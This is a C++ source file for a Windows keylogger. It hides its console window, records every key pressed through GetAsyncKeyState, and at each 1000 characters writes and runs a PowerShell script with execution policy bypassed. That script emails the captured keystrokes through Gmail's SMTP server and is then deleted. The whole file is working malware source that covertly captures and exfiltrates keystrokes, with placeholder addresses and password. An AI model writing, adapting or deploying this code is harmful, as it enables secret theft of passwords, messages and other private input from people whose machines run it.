#include <iostream>
#include<windows.h>
#include<winuser.h>
#include<string>
#include<fstream>
using namespace std;
void send(string s,string Receiver,string Sender,string password){
fstream write;
write.open("ATTACHMENT.ps1",ios::out|ios::app|ios::binary);
write<<"$EmailFrom = “"<<Sender<<"” \n $EmailTo = “"<<Receiver<<"” \n $Subject = “Keylogger” \n $Body = “"<<s<<"” \n $SMTPServer = “smtp.gmail.com” \n $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) \n $SMTPClient.EnableSsl = $true \n $SMTPClient.Credentials = New-Object System.Net.NetworkCredential(“"<<Sender<<"”, “"<<password<<"”); \n $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)";
write.close();
system("powershell -executionPolicy bypass -file ATTACHMENT.ps1");
remove("ATTACHMENT.ps1");
    return ;
    }
void hide()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}
int main()
{
    hide();
    int c;
    string s;
    for(;;){
        for(c=8;c<=127;c++){
            if(GetAsyncKeyState(c)==-32767){
                    switch(c){
                    case VK_SPACE:s+="<[Space]>";break;
                    case VK_ESCAPE:s+="<ESC>";break;
                    case VK_END:s+="<END>";break;
                    case VK_RETURN:s+="<Enter>";break;
                    case VK_CONTROL:s+="<Ctrl>";
                    default:s+=(char)c;break;
                    }
            }

        }
        if(s.size()>1000){
                cout<<s;
            send(s,"ReceiverEmail@gmail.com","SenderMail@gmail.com","SenderMailPassword");
            s="";
        }
    }
    return 0;
}
